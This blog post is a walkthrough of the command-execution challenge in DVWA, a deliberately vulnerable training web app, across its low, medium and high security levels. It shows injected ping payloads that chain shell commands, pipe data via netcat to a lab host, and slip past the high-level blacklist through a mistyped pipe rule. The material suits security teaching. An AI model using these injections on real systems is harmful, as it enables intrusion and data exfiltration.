---
layout: post
title:  "DVWA Command Execution"
subtitle: "Damn Vulnerable Web Application"
date:   2017-02-18 13:00:00 -0500
author: "coastal"
header-img: "images/site-resources/dvwa-header.jpg"
---
# Security: Low

Starting off on the 'low' security setting, let's try command injection/execution with our given prompt. So we are given an input form for pinging an IP address. Let's see what happens when we enter 8.8.8.8 (Google's DNS servers):

```
POST /dvwa/vulnerabilities/exec/ HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.56.101/dvwa/vulnerabilities/exec/
Cookie: security=low; PHPSESSID=af2qff46iqe3c71vvn3l7tmde1; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

ip=8.8.8.8&submit=submit
```

First we generate this request, and the response:

<img src="{{ site.baseurl }}/images/dvwa/02_command_execution/google-dns-ping.jpg">

Hmm okay, that doesn't tell us much. And there is no response on a failed command (which we test by throwing 'fail') at it. Let's see if we can really naiively attach an extra command on by ending our ping command and adding another command on there:

```
8.8.8.8; echo test;
```

<img src="{{ site.baseurl }}/images/dvwa/02_command_execution/ping-test-append.jpg">

Alright! Looks like we can add commands on the end of our ping. How about if we ```nc``` some data back to our comp:

```
8.8.8.8; echo pwnd | nc 192.168.56.1 4444;echo sent;
```

<img src="{{ site.baseurl }}/images/dvwa/02_command_execution/ping-rev-shell.jpg">

And boom, we've pwnd this input.

# Security: Medium

Alright, upping the security level, we try the same command as before:

```
8.8.8.8; echo test
```

And fail. Well it's likely that they added some filtering to the input here. One common set of filters is to remove the ```&``` and ```;``` characters to prevent command chaining. However, we can try some logic gate manipulation to get our command injection to work. Looking at this chaining logic:

```
A; B    Run A and then B, regardless of success of A
A && B  Run B if A succeeded
A || B  Run B if A failed
```

We see that we can force our command to run if we can cause the ping command to fail. Let's give it a shot:

```
fail || echo pwnd | nc 192.168.56.1 4444
```

<img src="{{ site.baseurl }}/images/dvwa/02_command_execution/medium-injection.jpg">

Got 'em again!

# Security: Hard

The 'High' level imposes the following restrictions:

```
// Get input
$target = trim($_REQUEST[ 'ip' ]);
// Set blacklist
$substitutions = array(
	'&'  => '',
	';'  => '',
	'|  ' => '',
	'-'  => '',
	'$'  => '',
	'('  => '',
	')'  => '',
	'`'  => '',
	'||' => '',
);
// Remove any of the charactars in the array (blacklist).
$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
```

```trim``` This function returns a string with whitespace stripped from the beginning and end of ```str```

```str_replace``` Replace all occurrences of the search string with the replacement string

```
mixed str_replace ( mixed $search , mixed $replace , mixed $subject [, int &$count ] )
```

One thing we can pick out is a failure in the key's of ```substitutions```. The ```'| '``` key should be ```'|'```. This means that only pipes that are appended with a space match the blacklist. Let's try to inject without a space following our pipe:

```
8.8.8.8|echo pwnd
```

<img src="{{ site.baseurl }}/images/dvwa/02_command_execution/high-pwnd.jpg">

And we've got it!